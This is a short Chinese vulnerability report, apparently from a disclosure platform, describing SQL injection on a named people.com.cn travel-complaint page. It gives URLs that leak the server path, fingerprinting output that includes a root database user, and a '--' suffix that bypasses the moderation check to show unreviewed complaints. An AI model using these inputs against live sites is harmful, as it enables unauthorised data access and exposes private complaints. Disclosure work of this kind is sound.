简要描述：

参数中会检测select和union，严重影响本菜鸟前进的步伐..

详细说明：

http://travel315.people.com.cn/show.php?id=喵

会爆出路径：

Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in /usr/webroot/show.php on line 183



但是id不能包含select和union

http://travel315.people.com.cn/show.php?id=19727--select

这样会报：

你提交的数据非法，请检查后重新提交！



不过还是可以获取一些其他信息：



web application technology: PHP 5.2.6, Apache 2.2.10

back-end DBMS: MySQL 5.0.11

banner: '5.0.67-community-log'

available databases [1]:

[*] 315travel

current user: 'root@localhost'



然后本菜鸟就没有进一步的动作了...求大神指点..



这个漏洞的另一个可用处就是可以查看未审核的投诉，比如

我们访问

http://travel315.people.com.cn/show.php?id=12193

这个链接会提示“该条投诉没有通过审核!”

但是我们访问

http://travel315.people.com.cn/show.php?id=12193--

就可以看到它的内容了...

漏洞证明：

http://travel315.people.com.cn/show.php?id=12193



http://travel315.people.com.cn/show.php?id=12193--

修复方案：

喵
